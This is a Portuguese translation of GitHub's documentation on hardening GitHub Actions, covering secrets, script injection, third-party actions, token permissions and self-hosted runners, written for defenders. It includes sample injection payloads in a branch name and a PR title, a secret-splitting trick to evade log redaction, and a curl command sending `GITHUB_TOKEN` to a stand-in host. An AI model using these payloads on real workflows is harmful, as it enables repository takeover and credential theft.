---
title: Fortalecimento de segurança para o GitHub Actions
shortTitle: Security hardening
intro: 'Boas práticas de segurança para usar recursos do {% data variables.product.prodname_actions %}.'
redirect_from:
  - /actions/getting-started-with-github-actions/security-hardening-for-github-actions
  - /actions/learn-github-actions/security-hardening-for-github-actions
versions:
  fpt: '*'
  ghes: '*'
  ghae: '*'
  ghec: '*'
type: overview
topics:
  - Security
miniTocMaxHeadingLevel: 3
ms.openlocfilehash: 0f93496361500083c23ef6f5095a785855246503
ms.sourcegitcommit: b617c4a7a1e4bf2de3987a86e0eb217d7031490f
ms.translationtype: HT
ms.contentlocale: pt-BR
ms.lasthandoff: 11/11/2022
ms.locfileid: '148161212'
---
{% data reusables.actions.enterprise-beta %} {% data reusables.actions.enterprise-github-hosted-runners %}

## Visão geral

Este guia explica como configurar o fortalecimento de segurança para certos recursos de {% data variables.product.prodname_actions %}. Se não estiver familiarizado com os conceitos do {% data variables.product.prodname_actions %}, confira "[Conceitos principais do GitHub Actions](/actions/getting-started-with-github-actions/core-concepts-for-github-actions)".

## Usando segredos

Valores sensíveis nunca devem ser armazenados como texto simples em arquivos de fluxo de trabalho, mas como segredos. Os [segredos](/actions/configuring-and-managing-workflows/creating-and-storing-encrypted-secrets) podem ser configurados no nível de organização, repositório ou ambiente e permitem que você armazene informações confidenciais no {% data variables.product.product_name %}.

Os segredos usam [caixas lacradas do Libsodium](https://libsodium.gitbook.io/doc/public-key_cryptography/sealed_boxes) para que sejam criptografadas antes de chegar ao {% data variables.product.product_name %}. Isso ocorre quando o segredo é enviado [pela interface do usuário](/actions/configuring-and-managing-workflows/creating-and-storing-encrypted-secrets#creating-encrypted-secrets-for-a-repository) ou pela [API REST](/rest/reference/actions#secrets). Esta criptografia do lado do cliente ajuda a minimizar os riscos relacionados ao registro acidental (por exemplo, registros de exceções e de solicitação, entre outros) dentro da infraestrutura do {% data variables.product.product_name %}. Uma vez realizado o upload do segredo, o {% data variables.product.product_name %} poderá descriptografá-lo para que possa ser injetado no tempo de execução do fluxo de trabalho.

Para ajudar a prevenir a divulgação acidental, o {% data variables.product.product_name %} usa um mecanismo que tenta redigir quaisquer segredos que aparecem nos registros de execução. Esta redação procura correspondências exatas de quaisquer segredos configurados, bem como codificações comuns dos valores, como Base64. No entanto, como há várias maneiras de transformar o valor de um segredo, essa anulação não é garantida. Como resultado, existem certas etapas proativas e boas práticas que você deve seguir para ajudar a garantir que os segredos sejam editados, e para limitar outros riscos associados aos segredos:

- **Nunca usar dados estruturados como um segredo**
    - Os dados estruturados podem fazer com que ocorra uma falha nos registros de segredos, pois a redação depende, em grande parte, de encontrar uma correspondência exata para o valor específico do segredo. Por exemplo, não use um blob de JSON, XML, ou YAML (ou similar) para encapsular o valor de um segredo, já que isso reduz significativamente a probabilidade de os segredos serem devidamente redigidos. Em vez disso, crie segredos individuais para cada valor sensível.
- **Registrar todos os segredos usados nos fluxos de trabalho**
    - Se um segredo for usado para gerar outro valor confidencial em um fluxo de trabalho, esse valor gerado deverá ser [formalmente registrado como um segredo](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret), para que seja editado se aparecer nos logs. Por exemplo, se, ao usar uma chave privada para gerar um JWT assinado para acessar uma API web, certifique-se de registrar que JWT é um segredo ou não será redigido se entrar na saída de do registro.
    - O registro de segredos também aplica-se a qualquer tipo de transformação/codificação. Se seu segredo foi transformado de alguma forma (como Base64 ou URL codificada), certifique-se de registrar o novo valor como um segredo também.
- **Auditar a forma como os segredos são tratados**
    - Audite como os segredos são usados, para ajudar a garantir que estejam sendo tratados conforme o esperado. Você pode fazer isso revisando o código-fonte do repositório que executa o fluxo de trabalho e verificando quaisquer ações usadas no fluxo de trabalho. Por exemplo, verifique se eles não são enviados para hosts não pretendidos, ou impressos explicitamente na saída de um registro.
    - Visualize os registros de execução do seu fluxo de trabalho depois de testar entradas válidas/inválidas e, em seguida, verifique se os segredos estão sendo editados corretamente ou não são mostrados. Nem sempre é óbvio como um comando ou uma ferramenta que você está invocando enviará erros para `STDOUT` e `STDERR`, e os segredos podem acabar nos logs de erros. Como resultado, considera-se uma boa prática rever manualmente os registros do fluxo de trabalho depois de testar entradas válidas e inválidas.
- **Usar credenciais que têm escopo mínimo**
    - Certifique-se de que as credenciais usadas nos fluxos de trabalho têm o menor privilégio necessário e esteja ciente de que qualquer usuário com acesso de gravação ao repositório terá acesso de leitura a todos os segredos configurados no seu repositório. 
    - O Actions pode usar o `GITHUB_TOKEN` acessando-o no contexto `github.token`. Para obter mais informações, confira "[Contextos](/actions/learn-github-actions/contexts#github-context)". Portanto, você deve verificar se o `GITHUB_TOKEN` recebeu as permissões mínimas necessárias. É uma boa prática de segurança definir a permissão padrão para o `GITHUB_TOKEN` como somente acesso de leitura no conteúdo do repositório. As permissões podem ser aumentadas, conforme necessário, para tarefas individuais dentro do arquivo do fluxo de trabalho. Para obter mais informações, confira "[Autenticação em um fluxo de trabalho](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token)". 
- **Auditar e girar os segredos registrados**
    - Reveja, periodicamente, os segredos registrados para confirmar se ainda são necessários. Remova aqueles que não são mais necessários.
    - Gire os segredos periodicamente para reduzir a janela de tempo durante a qual um segredo comprometido é válido.
- **Considerar a necessidade de revisão para acesso a segredos**
    - Você pode usar revisores necessários para proteger os segredos do ambiente. Um trabalho de fluxo de trabalho não pode acessar segredos de ambiente até que a aprovação seja concedida por um revisor. Para obter mais informações sobre como armazenar segredos em ambientes ou exigir revisões para ambientes, confira "[Segredos criptografados](/actions/reference/encrypted-secrets)" e "[Como usar ambientes para implantação](/actions/deployment/using-environments-for-deployment)".

{% warning %}

**Aviso**: qualquer usuário com acesso de gravação no seu repositório tem acesso de leitura a todos os segredos configurados nele. Portanto, você deve garantir que as credenciais que estão sendo usadas nos fluxos de trabalho tenham os privilégios mínimos necessários.

{% endwarning %}

## Como usar `CODEOWNERS` para monitorar alterações

Use o recurso `CODEOWNERS` para controlar como são feitas alterações nos seus arquivos de fluxo de trabalho. Por exemplo, se todos os arquivos de fluxo de trabalho forem armazenados em `.github/workflows`, você poderá adicionar esse diretório à lista de proprietários do código, de modo que todas as alterações propostas nesses arquivos exijam primeiro a aprovação de um revisor designado.

Para obter mais informações, confira "[Sobre os proprietários de código](/github/creating-cloning-and-archiving-repositories/about-code-owners)".

## Entendendo o risco de injeções de script

Ao criar fluxos de trabalho, [ações personalizadas](/actions/creating-actions/about-actions) e [ações compostas](/actions/creating-actions/creating-a-composite-action), você sempre deve considerar se o seu código pode executar entradas não confiáveis de invasores. Isso pode ocorrer quando um invasor adiciona comandos maliciosos e scripts em um contexto. Quando seu fluxo de trabalho é executado, essas strings podem ser interpretadas como código que é executado no executado.

 Os invasores podem adicionar um conteúdo próprio mal-intencionado ao [contexto `github`](/actions/reference/context-and-expression-syntax-for-github-actions#github-context), que deve ser tratado como uma entrada potencialmente não confiável. Esses contextos geralmente terminam com `body`, `default_branch`, `email`, `head_ref`, `label`, `message`, `name`, `page_name`,`ref` e `title`.  Por exemplo: `github.event.issue.title` ou `github.event.pull_request.body`.

 Você deve garantir que esses valores não fluam diretamente para fluxos de trabalho, ações, chamadas de API ou para qualquer outro lugar onde possam ser interpretados como código executável. Ao adotar a mesma postura defensiva de programação que você adotaria para qualquer outro código privilegiado do aplicativo, você pode ajudar a melhorar a segurança do seu uso de {% data variables.product.prodname_actions %}. Para obter informações sobre algumas das etapas que um invasor pode executar, confira ["Impacto potencial de um executor comprometido](/actions/learn-github-actions/security-hardening-for-github-actions#potential-impact-of-a-compromised-runner)".

Além disso, há outras fontes menos óbvias de entrada potencialmente não confiável como, por exemplo, nomes de branches e endereços de e-mail, que podem ser bastante flexíveis em termos de conteúdo permitido. Por exemplo, `zzz";echo${IFS}"hello";#` será um nome de branch válido e um possível vetor de ataque em um repositório de destino.

As seções a seguir explicam como você pode ajudar a mitigar o risco de injeção de scripts.

### Exemplo de um ataque de injeção de script

Um ataque de injeção de script pode ocorrer diretamente dentro do script embutido de um fluxo de trabalho. No exemplo a seguir, uma ação usa uma expressão para testar a validade de um título de pull request mas também adiciona o risco de injeção de script:

{% raw %}
```
      - name: Check PR title
        run: |
          title="${{ github.event.pull_request.title }}"
          if [[ $title =~ ^octocat ]]; then
          echo "PR title starts with 'octocat'"
          exit 0
          else
          echo "PR title did not start with 'octocat'"
          exit 1
          fi
```
{% endraw %}

Este exemplo é vulnerável à injeção do script porque o comando `run` é executado dentro de um script de shell temporário no executor. Antes que o script de shell seja executado, as expressões dentro de {% raw %}`${{ }}`{% endraw %} são avaliadas e substituídas pelos valores resultantes, o que pode torná-lo vulnerável à injeção de comando do shell.

Para injetar comandos neste fluxo de trabalho, o invasor pode criar uma solicitação de pull com o título `a"; ls $GITHUB_WORKSPACE"`:

![Exemplo de injeção de script no título do PR](/assets/images/help/images/example-script-injection-pr-title.png)

Neste exemplo, o caractere `"` é usado para interromper a instrução {% raw %}`title="${{ github.event.pull_request.title }}"`{% endraw %}, permitindo que o comando `ls` seja executado no executor. Você poderá ver a saída do comando `ls` no log:

![Exemplo de resultado da injeção de script](/assets/images/help/images/example-script-injection-result.png)

## Práticas recomendadas para mitigar ataques de injeção de script

Há uma série de diferentes abordagens disponíveis para ajudar você a mitigar o risco de injeção de script:

### Usando uma ação em vez de um script em linha (recomendado)

A abordagem recomendada é criar uma ação que processa o valor do contexto como um argumento. Esta abordagem não é vulnerável ao ataque de injeção, como o valor do contexto não é usado para gerar um script do shell, mas é passado para a ação como um argumento:

{% raw %}
```
uses: fakeaction/checktitle@v3
with:
    title: ${{ github.event.pull_request.title }}
```
{% endraw %}

### Usando uma variável de ambiente intermediária

Para scripts em linha, a abordagem preferida para manipular entradas não confiáveis é definir o valor da expressão para uma variável de ambiente intermediário.

O seguinte exemplo usa o Bash para processar o valor `github.event.pull_request.title` como uma variável de ambiente:

{% raw %}
```
      - name: Check PR title
        env:
          TITLE: ${{ github.event.pull_request.title }}
        run: |
          if [[ "$TITLE" =~ ^octocat ]]; then
          echo "PR title starts with 'octocat'"
          exit 0
          else
          echo "PR title did not start with 'octocat'"
          exit 1
          fi
```
{% endraw %}

Neste exemplo, a injeção de script não tem sucesso:

![Exemplo de injeção de script mitigado](/assets/images/help/images/example-script-injection-mitigated.png)

Com esta abordagem, o valor da expressão {% raw %}`${{ github.event.issue.title }}`{% endraw %} é armazenado na memória e usada como uma variável e não interage com o processo de geração de script. Além disso, considere o uso de variáveis de shell de aspas duplas para evitar a [divisão de palavras](https://github.com/koalaman/shellcheck/wiki/SC2086), mas essa é [uma das muitas](https://mywiki.wooledge.org/BashPitfalls) recomendações gerais para escrita de scripts de shell e não é específica do {% data variables.product.prodname_actions %}.

{% ifversion fpt or ghec %}
### Usando fluxos de trabalho iniciais para digitalização de código

{% data reusables.advanced-security.starter-workflows-beta %} A {% data variables.product.prodname_code_scanning_capc %} permite que você descubra vulnerabilidades de segurança antes que elas cheguem à produção. {% data variables.product.product_name %} fornece fluxos de trabalho iniciais para {% data variables.product.prodname_code_scanning %}. Você pode usar esses fluxos de trabalho sugeridos para construir seus fluxos de trabalho de {% data variables.product.prodname_code_scanning %}, ao invés de começar do zero. O fluxo de trabalho do {% data variables.product.company_short%}, o {% data variables.code-scanning.codeql_workflow %}, é ativado pelo {% data variables.product.prodname_codeql %}. Também existem fluxos de trabalho de terceiros iniciantes disponíveis.

Para obter mais informações, confira "[Sobre a {% data variables.product.prodname_code_scanning %}](/code-security/code-scanning/automatically-scanning-your-code-for-vulnerabilities-and-errors/about-code-scanning)" e "[Como configurar a {% data variables.product.prodname_code_scanning %} usando fluxos de trabalho iniciais](/code-security/code-scanning/automatically-scanning-your-code-for-vulnerabilities-and-errors/setting-up-code-scanning-for-a-repository#setting-up-code-scanning-using-starter-workflows)".

{% endif %}

### Restringir permissões para tokens

Para ajudar a mitigar o risco de um token exposto, considere restringir as permissões atribuídas. Para obter mais informações, confira "[Como modificar as permissões para o GITHUB_TOKEN](/actions/reference/authentication-in-a-workflow#modifying-the-permissions-for-the-github_token)".

{% ifversion fpt or ghec or ghes > 3.4 %}

## Usando o OpenID Connect para acessar os recursos da nuvem

{% data reusables.actions.about-oidc-short-overview %}

{% endif %}

## Usando ações de terceiros

Os trabalhos individuais em fluxo de trabalho podem interagir com (e comprometer) outros trabalhos. Por exemplo, um trabalho que consulta as variáveis de ambiente usadas por um trabalho posterior, que escreve arquivos para um diretório compartilhado que um trabalho posterior processa, ou ainda mais diretamente, que interage com o conector do Docker e inspeciona outros contêineres em execução e executa comandos neles.

Isso significa que comprometer uma só ação em um fluxo de trabalho pode ser muito significativo, pois essa ação comprometida terá acesso a todos os segredos configurados no repositório e poderá usar o `GITHUB_TOKEN` para fazer gravações no repositório. Consequentemente, há um risco significativo em fornecer de ações de repositórios de terceiros no {% data variables.product.prodname_dotcom %}. Para obter informações sobre algumas das etapas que um invasor pode executar, confira ["Impacto potencial de um executor comprometido](/actions/learn-github-actions/security-hardening-for-github-actions#potential-impact-of-a-compromised-runner)".

Você pode ajudar a mitigar esse risco seguindo estas boas práticas:

* **Fixar as ações em um SHA de commit de comprimento completo**

  Fixar uma ação para um commit SHA de comprimento completo é, atualmente, a única maneira de usar uma ação como uma versão imutável. Fixar um SHA em particular ajuda a mitigar o risco de um ator malicioso adicionar uma porta traseira ao repositório da ação, porque precisariam gerar uma colisão de SHA-1 para uma carga válida do objeto de Git.

* **Auditar o código-fonte da ação**

  Certifique-se de que a ação está tratando o conteúdo do seu repositório e os segredos, como esperado. Por exemplo, verifique se os segredos não são enviados para os hosts não intencionais, ou se não são registrados inadvertidamente.

* **Fixar ações em uma marca somente se você confiar no criador**

  Embora a fixação de um commit de SHA seja a opção mais segura, especificar uma etiqueta é a opção mais conveniente, além de ser amplamente usada. Se você desejar de especificar uma etiqueta, certifique-se de que você confia nos criadores da ação. O selo "Criador verificado" em {% data variables.product.prodname_marketplace %} é um sinal útil, já que indica que a ação foi escrita por uma equipe cuja identidade foi verificada por {% data variables.product.prodname_dotcom %}. Observe que há risco para esta abordagem, mesmo que você confie no autor, porque uma etiqueta pode ser movida ou excluída se um ator malicioso obtiver acesso ao repositório que armazena a ação.

{% ifversion fpt or ghes > 3.3 or ghae > 3.3 or ghec %}
## Reutilizando fluxos de trabalho de terceiros

Os mesmos princípios descritos acima para o uso de ações de terceiros também se aplicam ao uso de fluxos de trabalho de terceiros. Você pode ajudar a mitigar os riscos associados à reutilização de fluxos de trabalho, seguindo as mesmas práticas recomendadas descritas acima. Para obter mais informações, confira "[Como reutilizar fluxos de trabalho](/actions/learn-github-actions/reusing-workflows)".
{% endif %}

{% ifversion internal-actions %}
## Permitir que os fluxos de trabalho acessem repositórios internos

{% data reusables.actions.outside-collaborators-internal-actions %} Para obter mais informações, confira "[Como compartilhar ações e fluxos de trabalho com sua empresa](/actions/creating-actions/sharing-actions-and-workflows-with-your-enterprise)".
{% endif %}

{% ifversion allow-actions-to-approve-pr %}
## Como impedir o {% data variables.product.prodname_actions %} de {% ifversion allow-actions-to-approve-pr-with-ent-repo %}criar ou {% endif %}aprovar solicitações de pull

{% data reusables.actions.workflow-pr-approval-permissions-intro %} Permitir que fluxos de trabalho ou qualquer outra automação {% ifversion allow-actions-to-approve-pr-with-ent-repo %}criem ou {% endif %}aprovem solicitações de pull pode ser um risco de segurança se a solicitação de pull for mesclada sem a supervisão adequada.

Para obter mais informações sobre como definir essa configuração, confira {% ifversion allow-actions-to-approve-pr-with-ent-repo %}{% ifversion ghes or ghec or ghae %}"[Impor políticas para {% data variables.product.prodname_actions %} em sua empresa](/enterprise-cloud@latest/admin/policies/enforcing-policies-for-your-enterprise/enforcing-policies-for-github-actions-in-your-enterprise#preventing-github-actions-from-creating-or-approving-pull-requests)",{% endif %}{% endif %} "[Desabilitando ou limitando {% data variables.product.prodname_actions %} em sua organização](/github/setting-up-and-managing-organizations-and-teams/disabling-or-limiting-github-actions-for-your-organization#preventing-github-actions-from-{% ifversion allow-actions-to-approve-pr-with-ent-repo %}creating-or-{% endif %}approving-pull-requests)"{% ifversion allow-actions-to-approve-pr-with-ent-repo %} e "[ Gerenciando configurações de {% data variables.product.prodname_actions %} em um repositório](/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository#preventing-github-actions-from-creating-or-approving-pull-requests)"{% endif %}.
{% endif %}

## Usando os Scorecards OpenSSF para proteger fluxos de trabalho

O [Scorecards](https://github.com/ossf/scorecard) é uma ferramenta de segurança automatizada que sinaliza as práticas suspeitas da cadeia de fornecedores. Você poderá usar a [ação Scorecards](https://github.com/marketplace/actions/ossf-scorecard-action) e o [fluxo de trabalho inicial](https://github.com/actions/starter-workflows) para seguir as melhores práticas de segurança. Uma vez configurada, a ação Scorecards é executada automaticamente nas alterações de repositórios e alerta de desenvolvedores sobre práticas arriscadas em cadeia de suprimentos que usam a experiência de digitalização embutida do código. O projeto Scorecards executa um número de verificações, incluindo ataques de injeção de script, permissões de token e ações fixadas.

## Possível impacto de um executor comprometido

Essas seções consideram alguns das etapas que um invasor pode dar se for capaz de executar comandos maliciosos em um executor de {% data variables.product.prodname_actions %}.

{% note %}

**Observação:** executores hospedados pelo {% data variables.product.prodname_dotcom %} não verificam código mal-intencionado baixado por um usuário durante o trabalho, como uma biblioteca de terceiros comprometida.

{% endnote %}

### Acessar segredos

Os fluxos de trabalho disparados com o evento `pull_request` têm permissões somente leitura e não tem acesso aos segredos. No entanto, essas permissões são diferentes para vários gatilhos de evento, como `issue_comment`, `issues` e `push`, em que o invasor pode tentar roubar segredos do repositório ou usar a permissão de gravação do [`GITHUB_TOKEN`](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token) do trabalho.

- Se o segredo ou o token for definido como uma variável de ambiente, ele poderá ser acessado diretamente por meio do ambiente com `printenv`.
- Se o segredo for usado diretamente em uma expressão, o script do shell gerado é armazenado em disco e é acessível.
- Para uma ação personalizada, o risco pode variar dependendo de como um programa está usando o segredo que obteve do argumento:

  {% raw %}
  ```
  uses: fakeaction/publish@v3
  with:
      key: ${{ secrets.PUBLISH_KEY }}
  ```
  {% endraw %}

Embora o {% data variables.product.prodname_actions %} remova os segredos da memória que não estão referenciados no fluxo de trabalho (ou em uma ação incluída), o `GITHUB_TOKEN` e todos os segredos referenciados podem ser coletados por um invasor determinado.

### Exfiltrar dados de um executor

Um invasor pode exfiltrar todos os segredos roubados ou outros dados do executor. Para ajudar a impedir a divulgação acidental de segredos, o {% data variables.product.prodname_actions %} [edita automaticamente os segredos editados impressos no log](/actions/reference/encrypted-secrets#accessing-your-secrets), mas esse não é um verdadeiro limite de segurança, porque os segredos podem ser enviados intencionalmente para o log. Por exemplo, os segredos ocultados podem ser exportados por meio de `echo ${SOME_SECRET:0:4}; echo ${SOME_SECRET:4:200};`. Além disso, uma vez que o atacante pode executar comandos arbitrários, ele poderá usar solicitações HTTP para enviar segredos ou outros dados do repositório para um servidor externo.

### Roubo do `GITHUB_TOKEN` do trabalho

É possível que um invasor roube o `GITHUB_TOKEN` de um trabalho. O executor do {% data variables.product.prodname_actions %} recebe automaticamente um `GITHUB_TOKEN` gerado com permissões limitadas apenas ao repositório que contém o fluxo de trabalho, e o token vence após a conclusão do trabalho. Uma vez expirado, o token não é mais útil para um invasor. Para resolver essa limitação, ele pode automatizar o ataque e executá-lo em frações de segundos chamando um servidor controlado pelo invasor com o token, por exemplo: `a"; set +e; curl http://example.com?token=$GITHUB_TOKEN;#`

### Modificando os conteúdos de um repositório

O servidor do invasor pode usar a API do {% ifversion fpt or ghec %}{% data variables.product.prodname_dotcom %}{% else %}{% data variables.product.product_name %}{% endif %} para [modificar o conteúdo do repositório](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token), incluindo as versões, se as permissões atribuídas do `GITHUB_TOKEN` [não forem restritas](/actions/reference/authentication-in-a-workflow#modifying-the-permissions-for-the-github_token).

## Considerar acesso entre repositórios

O {% data variables.product.prodname_actions %} tem um escopo intencional para um único repositório por vez. O `GITHUB_TOKEN` permite o mesmo nível de acesso que um usuário com acesso de gravação, porque qualquer usuário com acesso de gravação pode acessar esse token criando ou modificando um arquivo de fluxo de trabalho, elevando as permissões do `GITHUB_TOKEN` se necessário. Os usuários têm permissões específicas para cada repositório. Portanto, permitir que o `GITHUB_TOKEN` de um repositório permita acesso a outro causará um impacto no modelo de permissão do {% data variables.product.prodname_dotcom %} se isso não for implementado com cuidado. Da mesma forma, deve-se ter cuidado ao adicionar tokens de autenticação de {% data variables.product.prodname_dotcom %} a um fluxo de trabalho, porque isto também pode afetar o modelo de permissão de {% data variables.product.prodname_dotcom %} concedendo inadvertidamente amplo acesso aos colaboradores.

Temos [um plano no roteiro do {% data variables.product.prodname_dotcom %}](https://github.com/github/roadmap/issues/74) para dar suporte a um fluxo que permita o acesso entre repositórios do {% data variables.product.product_name %}, embora esse ainda não seja um recurso com suporte. Atualmente, a única maneira de executar interações privilegiadas entre repositórios é colocar um token de autenticação do {% data variables.product.prodname_dotcom %} ou chave SSH como um segredo dentro do fluxo de trabalho. Uma vez que muitos tipos de token de autenticação não permitem acesso granular a recursos específicos, há um risco significativo no uso do tipo incorreto de token, pois ele pode conceder acesso muito mais amplo do que o pretendido.

Esta lista descreve as abordagens recomendadas para acessar os dados do repositório dentro de um fluxo de trabalho, em ordem decrescente de preferência:

1. **O `GITHUB_TOKEN`**
    -  Esse token tem o escopo intencionalmente definido para o repositório único que invocou o fluxo de trabalho e pode ter o mesmo nível de acesso que um usuário com acesso de gravação no repositório. O token é criado antes de cada trabalho começar e expira quando o trabalho é finalizado. Para obter mais informações, confira "[Como se autenticar com o GITHUB_TOKEN](/actions/configuring-and-managing-workflows/authenticating-with-the-github_token)".
    - O `GITHUB_TOKEN` deve ser usado sempre que possível.
2. **Chave de implantação do repositório**
    - Chaves de implantação são um dos únicos tipos de credenciais que concedem acesso de leitura ou gravação a um único repositório, e podem ser usadas para interagir com outro repositório dentro de um fluxo de trabalho. Para obter mais informações, confira "[Como gerenciar chaves de implantação](/developers/overview/managing-deploy-keys#deploy-keys)".
    - Observe que as chaves de implantação só podem clonar e fazer push para o repositório usando o Git, e não podem ser usada para interagir com a API REST ou o GraphQL. Portanto, elas podem não ser apropriadas para os suas necessidades.
3. **Tokens do {% data variables.product.prodname_github_app %}**
    - {% data variables.product.prodname_github_apps %} podem ser instalados em repositórios selecionados e até mesmo ter permissões granulares nos recursos dentro deles. É possível criar um {% data variables.product.prodname_github_app %} interno na sua organização, instalá-lo nos repositórios os quais você precisa acessar dentro do seu fluxo de trabalho, e autenticar como instalação dentro de seu fluxo de trabalho para acessar esses repositórios.
4. **{% data variables.product.pat_generic %}s**
    - Você nunca deve usar um {% data variables.product.pat_v1 %}. Esses tokens concedem acesso a todos os repositórios nas organizações às quais você tem acesso, bem como a todos os repositórios pessoais na sua conta pessoal. Isto concede indiretamente amplo acesso a todos os usuários com acesso de gravação do repositório no qual se encontra o fluxo de trabalho.
    - Se você usar um {% data variables.product.pat_generic %}, nunca deverá usar um {% data variables.product.pat_generic %} da própria conta. Se você deixar uma organização mais adiante, os fluxos de trabalho que usam este token falharão imediatamente e a depuração deste problema pode ser difícil. Em vez disso, você deve usar um {% ifversion pat-v2%}{% data variables.product.pat_v2 %}s{% else %}{% data variables.product.pat_generic %}s{% endif %} para uma nova conta que pertence à sua organização e só recebeu acesso aos repositórios específicos necessários para o fluxo de trabalho. Observe que esta abordagem não é escalável e deve ser evitada em detrimento de alternativas, como as chaves de implantação.
5. **Chaves SSH em uma conta pessoal**
    - Os fluxos de trabalho nunca devem usar as chaves SSH em uma conta pessoal. Semelhante a {% data variables.product.pat_v1_plural %}, eles concedem permissões de leitura/gravação a todos os seus repositórios pessoais, bem como a todos os repositórios aos quais você tem acesso por meio da associação à organização.  Isto concede indiretamente amplo acesso a todos os usuários com acesso de gravação do repositório no qual se encontra o fluxo de trabalho. Se você pretende usar uma chave SSH porque você só precisa executar clones ou push do repositório, e não precisar interagir com APIs públicas, você deverá usar chaves de implantação individuais.

## Fortalecimento para executores auto-hospedados

{% ifversion fpt or ghec %} Os **executores hospedados pelo {% data variables.product.prodname_dotcom %}** executam o código em máquinas virtuais isoladas efêmeras e limpas. Ou seja, não é possível comprometer de maneira persistente este ambiente ou obter, de outro modo, acesso a mais informações do que foram colocadas no ambiente durante o processo de inicialização.
{% endif %}

Os executores {% ifversion fpt or ghec %}**Auto-hospedados**{% elsif ghes or ghae %}Auto-hospedados{% endif %} do {% data variables.product.product_name %} não fornecem garantias de serem executados em máquinas virtuais efêmeras e limpas e podem ser comprometidos de maneira persistente por um código não confiável em um fluxo de trabalho.

{% ifversion fpt or ghec %}Como resultado, os executores auto-hospedados quase [nunca devem ser usados para repositórios públicos](/actions/hosting-your-own-runners/about-self-hosted-runners#self-hosted-runner-security) no {% data variables.product.product_name %}, porque qualquer usuário pode abrir solicitações de pull no repositório e comprometer o ambiente. Da mesma forma,tenha{% elsif ghes or ghae %}Tenha{% endif %} cuidado ao usar executores auto-hospedados em repositórios privados ou internos, pois qualquer pessoa que possa criar um fork do repositório e abrir uma solicitação de pull (geralmente aqueles com acesso de leitura no repositório) pode comprometer o ambiente do executor auto-hospedado, incluindo a obtenção do acesso a segredos e ao `GITHUB_TOKEN` que, dependendo das configurações, pode permitir o acesso de gravação no repositório. Embora os fluxos de trabalho possam controlar o acesso a segredos de ambiente usando os ambientes e revisões necessários, estes fluxos de trabalho não são executados em um ambiente isolado e continuam sendo susceptíveis aos mesmos riscos quando são executados por um executor auto-hospedado.

Quando um executor auto-hospedado é definido no nível da organização ou empresa, {% data variables.product.product_name %} pode programar fluxos de trabalho de vários repositórios para o mesmo executor. Consequentemente, um compromisso de segurança destes ambientes pode ter um grande impacto. Para ajudar a reduzir o escopo de um compromisso, você pode criar limites organizando seus executores auto-hospedados em grupos separados. Você pode restringir os {% ifversion restrict-groups-to-workflows %}fluxos de trabalho, as {% endif %}organizações e os repositórios que podem acessar os grupos de executores. Para obter mais informações, confira "[Como gerenciar o acesso a executores auto-hospedados usando grupos](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups)".

Você também deve considerar o ambiente das máquinas de executores auto-hospedadas:
- Que informação sensível reside na máquina configurada como um executor auto-hospedado? Por exemplo, chaves SSH privadas, tokens de acesso à API, entre outros.
- A máquina tem acesso à rede a serviços sensíveis? Por exemplo, serviços de metadados do Azure ou AWS. A quantidade de informações confidenciais neste ambiente deve ser limitada ao mínimo, e você deve estar sempre ciente de que qualquer usuário capaz de invocar fluxos de trabalho terá acesso a esse ambiente.

Alguns clientes podem tentar mitigar parcialmente esses riscos implementando sistemas que destroem automaticamente o executor auto-hospedado após cada execução do trabalho. No entanto, esta abordagem poderá não ser tão eficaz como pretendido, uma vez que não há forma de garantir que um executor auto-hospedado execute apenas um trabalho. Alguns trabalhos usarão segredos como argumentos de linha de comando que podem ser vistos por outro trabalho em execução no mesmo executor, como `ps x -w`. Isso pode gerar vazamento de segredos.

### Planejando sua estratégia de gerenciamento para executores auto-hospedados

Um executor auto-hospedado pode ser adicionado aos vários níveis na sua hierarquia de {% data variables.product.prodname_dotcom %}: empresa, organização ou repositório. Este posicionamento determina quem será poderá de gerenciar o executor:

**Gerenciamento centralizado:**
  - Se você planeja ter uma equipe centralizada que detém os executores auto-hospedados, recomenda-se adicionar seus executores ao nível mais alto da organização mútua ou da empresa. Isto fornece à sua equipe um único local para visualizar e gerenciar seus executores.
  - Se você tiver apenas uma única organização, adicionar seus executores ao nível da organização é, de fato, a mesma abordagem, mas você pode encontrar dificuldades se você adicionar outra organização no futuro.

**Gerenciamento descentralizado:**
  - Se cada equipe gerenciar seus próprios corredores hospedados, a recomendação será adicionar os executores ao mais alto nível de propriedade da equipe. Por exemplo, se cada equipe possui sua própria organização, será mais simples se os executores também forem adicionados ao nível da organização.
  - Você também pode adicionar executores no nível de repositório, mas isso adicionará uma sobrecarga de gerenciamento e também aumentará o número de executores necessários já que você não pode compartilhar executores entre repositórios.

{% ifversion fpt or ghec or ghes > 3.4 %}
### Efetuando a autenticação para seu provedor de nuvem

Se você está usando {% data variables.product.prodname_actions %} para implantar para um provedor da nuvem, ou pretender usar o HashiCorp Vault para o gerenciamento de segredos, recomenda-se que você use o OpenID Connect para criar tokens de acesso com escopos bem definidos, curtos e para as execuções do seu fluxo de trabalho. Para obter mais informações, confira "[Sobre a proteção de segurança com o OpenID Connect](/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect)".

{% endif %}

## Auditar eventos de {% data variables.product.prodname_actions %}

Você pode usar o log de auditoria para monitorar tarefas administrativas em uma organização. O log de auditoria registra o tipo de ação, quando ela foi executada e qual conta pessoal executou a ação.

Por exemplo, você pode usar o log de auditoria para acompanhar o evento `org.update_actions_secret`, que controla as alterações nos segredos da organização: ![Entradas do log de auditoria](/assets/images/help/repository/audit-log-entries.png)

As tabelas a seguir descrevem os eventos de {% data variables.product.prodname_actions %} que você pode encontrar no log de auditoria. Para obter mais informações sobre como usar o log de auditoria, confira "[Como revisar o log de auditoria da sua organização](/organizations/keeping-your-organization-secure/reviewing-the-audit-log-for-your-organization#searching-the-audit-log)" e "[Como revisar os logs de auditoria da sua empresa](/admin/monitoring-activity-in-your-enterprise/reviewing-audit-logs-for-your-enterprise)".

{% ifversion fpt or ghec %}
### Eventos para ambientes

| Ação | Descrição
|------------------|-------------------
| `environment.create_actions_secret` | Acionada quando um segredo é criado em um ambiente. Para obter mais informações, confira "[Segredos do ambiente](/actions/reference/environments#environment-secrets)".
| `environment.delete` | Acionada quando um ambiente é excluído. Para obter mais informações, confira "[Como excluir um ambiente](/actions/reference/environments#deleting-an-environment)".
